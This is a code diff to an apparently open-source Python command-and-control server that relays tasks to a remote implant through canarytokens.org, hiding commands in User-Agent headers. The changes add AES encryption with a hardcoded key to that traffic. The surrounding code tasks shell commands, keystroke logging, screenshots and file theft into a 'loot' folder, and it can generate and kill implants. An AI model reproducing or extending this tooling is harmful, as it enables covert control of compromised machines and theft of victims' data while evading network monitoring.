@@ -8,7 +8,11 @@ import base64
 import platform
 import re
 import subprocess
+import uuid
+
 import requests
+from Cryptodome.Cipher import AES
+from Cryptodome.Util.Padding import pad, unpad
 from bs4 import BeautifulSoup
 # TODO: fake_useragent is a pretty much a dead project. I'll add custom agents soon that will be used
 from fake_useragent import UserAgent
@@ -42,6 +46,41 @@ ps = False
 waitForKeys = False
 lootpath = ""
 requestedfile = ""
+trackingString = ""
+encrypted = True
+
+# Will add random key option for generated payloads later. I am focusing on basic implementation first so that's why it's hardcoded
+key = b'dRgUkXp2s5u8x/A?D(G+KbPeShVmYq3t'
+BLOCK_SIZE = 32
+
+def encrypt(message):
+    if encrypted:
+        try:
+            cipher = AES.new(key, AES.MODE_ECB)
+            encrypteddata = cipher.encrypt(pad(message,BLOCK_SIZE))
+            encrypteddataunhex = encrypteddata.hex()
+            return (encrypteddataunhex)
+
+        except Exception as e:
+            print(Fore.RED + "[-] " + Fore.RESET + " Encryption error: " + str(e))
+            pass
+    else:
+        return message
+
+
+def decrypt(encrypteddata):
+    if encrypted:
+        try:
+            encrypteddata = bytes.fromhex(encrypteddata)
+            decipher = AES.new(key, AES.MODE_ECB)
+            msg_dec = decipher.decrypt(encrypteddata)
+            return unpad(msg_dec, BLOCK_SIZE)
+
+        except Exception as e:
+            print(Fore.RED + "[-] " + Fore.RESET + " Decryption error: " + str(e))
+            pass
+    else:
+        return encrypteddata
 
 
 
@@ -85,18 +124,22 @@ def generate_canarytoken():
         sys.exit(1)
 
     else:
-        print(Fore.BLUE + "[!]" + Fore.RESET + " Token generated successfully")
+        print(Fore.BLUE + "[!]" + Fore.RESET + " Token successfully grabbed\n")
         global token
         token = response.json().get("Token")
         global url
         url = response.json().get("Url")
+        global trackingString
+        trackingString = str(uuid.uuid4())
         global authtoken
         authtoken = response.json().get("Auth")
         global canaryManagementURL
         canaryManagementURL = "https://www.canarytokens.org/history/?token=" + token + "&auth=" + authtoken
         print(Fore.BLUE + "[!]" + Fore.RESET + " Alert Token: " + token)
+        print(Fore.BLUE + "[!]" + Fore.RESET + " Encryption of traffic: " + str(encrypted))
         print(Fore.BLUE + "[!]" + Fore.RESET + " URL: " + url)
         print(Fore.BLUE + "[!]" + Fore.RESET + " Auth Token: " + authtoken)
+        print(Fore.BLUE + "[!]" + Fore.RESET + " UUID For Implant: " + trackingString)
         print(Fore.BLUE + "[!]" + Fore.RESET + " Canary Management URL: " + canaryManagementURL)
 
 
@@ -113,6 +156,7 @@ def taskCommand(cmd):
         cmd = "task:" + cmd
 
     cmd = base64.b64encode(cmd.encode("utf-8"))
+    cmd = encrypt(cmd)
     headers = {
         "User-Agent": cmd,
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
@@ -183,12 +227,13 @@ def getResults(lastdictsize):
 
         try:
             for count in reslist:
-                cmd = base64.b64decode(count).decode('utf-8')
+                cmd = base64.b64decode(decrypt(count)).decode('utf-8')
 
                 # Response was too long to send in >50 chunks, generate new token
                 if cmd == "toolong:":
                     print(
-                        Fore.BLUE + "\n[!]" + Fore.RESET + " Response too large to reconstruct. Command can not be ran")
+                        Fore.BLUE + "\n[!]" + Fore.RESET + " Response too large to reconstruct. Response can't be returned at this time (TOFIX)")
+                    print(Fore.BLUE + "[!]" + Fore.RESET + " If not a sensitive command, try with encryption disabled")
                     print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating new token to be safe")
                     fallback()
                     return 1
@@ -221,6 +266,8 @@ def getResults(lastdictsize):
                             if "useragent" in x.text:
                                 chunkedlist.append(x.find_next_sibling().string.strip())
 
+
+
                         # Loop until we have ALL the chunked data
                         if (len(chunkedlist)) == (len(reslist) + chunkedlen):
                             stringbuilder = ""
@@ -234,10 +281,14 @@ def getResults(lastdictsize):
                     # need to reverse the list
                     holder.reverse()
                     for q in holder:
-                        stringbuilder += base64.b64decode(q).decode('utf-8')
+                        stringbuilder+=q
 
-                    # print("Stringbuilder value:\n" + stringbuilder)
-                    # stringbuilder= stringbuilder.replace("res:", "")
+                    print("Stringbuilder value: " + stringbuilder)
+
+                    stringbuilder = base64.b64decode(decrypt(stringbuilder)).decode('utf-8')
+                    print("stringbuilder val after decoding: " + stringbuilder)
+
+
                     decodedlist.append(stringbuilder)
                     # Need to sleep for large requests
                     time.sleep(1)
@@ -300,7 +351,7 @@ def getResults(lastdictsize):
                     # Need to sleep for large requests
                     time.sleep(1)
                     doneChunked = True
-                    imgbytes = base64.b64decode(decodedlist[-1])
+                    imgbytes = base64.b64decode(decrypt(decodedlist[-1]))
                     timestr = time.strftime("%Y%m%d-%H%M%S")
 
                     with open(lootpath + timestr + ".jpg", "wb") as f:
@@ -363,7 +414,7 @@ def getResults(lastdictsize):
                     # Need to sleep for large requests
                     time.sleep(1)
                     doneChunked = True
-                    filebytes = base64.b64decode(decodedlist[-1])
+                    filebytes = base64.b64decode(decrypt(decodedlist[-1]))
                     timestr = time.strftime("%Y%m%d-%H%M%S")
 
                     with open(lootpath + timestr + requestedfile, "wb") as f:
@@ -429,10 +480,6 @@ def getResults(lastdictsize):
 
 
         except Exception as e:
-            # print(Fore.RED + "[-]" + Fore.RESET + " Error: " + str(e))
-            # exc_type, exc_obj, exc_tb = sys.exc_info()
-            # fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
-            # print(exc_type, fname, exc_tb.tb_lineno)
             pass
 
     return len(reslist) + 1
@@ -486,14 +533,13 @@ def wait_for_implant():
                         useragents.append(data[data.index(tr) + 1].text.strip())
 
                 for count in useragents:
-                    cmd = base64.b64decode(count).decode('utf-8')
+                    cmd = base64.b64decode(decrypt(count)).decode('utf-8')
                     if cmd == "hello":
                         global connected
                         connected = True
                         loop = False
 
             except Exception as e:
-                print(e)
                 pass
 
     doneWaitForImplant = True
@@ -503,6 +549,7 @@ def wait_for_implant():
 def implantSleep(time, jitter):
     cmd = "stime:" + str(time) + ":" + str(jitter)
     cmd = base64.b64encode(cmd.encode("utf-8"))
+    cmd = encrypt(cmd)
     headers = {
         "User-Agent": cmd,
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
@@ -549,6 +596,8 @@ def keystrokes(keychoice):
         print(Fore.RED + "[-]" + Fore.RESET + " Error. Returning with keystrokes command\n")
         return
 
+    cmd = encrypt(cmd)
+
     headers = {
         "User-Agent": cmd,
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
@@ -579,9 +628,6 @@ def fallback():
 
     except Exception as e:
         print(Fore.RED + "[-]" + Fore.RESET + " Error: " + str(e))
-        exc_type, exc_obj, exc_tb = sys.exc_info()
-        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
-        print(exc_type, fname, exc_tb.tb_lineno)
         pass
 
 
@@ -614,6 +660,7 @@ def killimplant(clean):
         cmd = "solongdirty:"
 
     cmd = base64.b64encode(cmd.encode("utf-8"))
+    cmd = encrypt(cmd)
     headers = {
         "User-Agent": cmd,
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
@@ -698,14 +745,13 @@ def main():
 
                 elif cmd.lower().startswith("local "):
                     try:
-                        print(Fore.BLUE + "[!]" + Fore.RESET + " Local Command Result:")
+                        print(Fore.BLUE + "[!]" + Fore.RESET + " Result of local command:")
                         out = subprocess.run(cmd.split("local ")[1], shell=True)
 
                     except:
                         pass
 
-
-
+                #TODO connect to listening implant
                 elif cmd.lower().startswith("connect "):
                     try:
                         cmd = cmd.replace("connect ", "")
@@ -715,7 +761,6 @@ def main():
                         url = ("http://canarytokens.com/about/" + canaryManagementURL[
                                                                   canaryManagementURL.index(start) + len(start):
                                                                   canaryManagementURL.index(end)] + "/contact.php")
-
 
                     except Exception as e:
                         print(e)
@@ -862,7 +907,6 @@ def main():
                         print(
                             Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
 
-
                 elif cmd.lower() == "create-implant":
                     if connected:
                         print(
@@ -914,6 +958,7 @@ def main():
                 elif cmd.lower() == "canary-info":
                     if connected:
                         print(Fore.BLUE + "\n[!]" + Fore.RESET + " Token: " + token)
+                        print(Fore.BLUE + "[!]" + Fore.RESET + " Encryption of traffic: " + str(encrypted))
                         print(Fore.BLUE + "[!]" + Fore.RESET + " Alert URL: " + url)
                         print(Fore.BLUE + "[!]" + Fore.RESET + " Auth Token: " + authtoken)
                         print(Fore.BLUE + "[!]" + Fore.RESET + " Canary Management URL: " + canaryManagementURL + "\n")
@@ -967,7 +1012,6 @@ def main():
                     else:
                         print(
                             Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
-
 
 
                 elif cmd.lower().startswith("shell "):
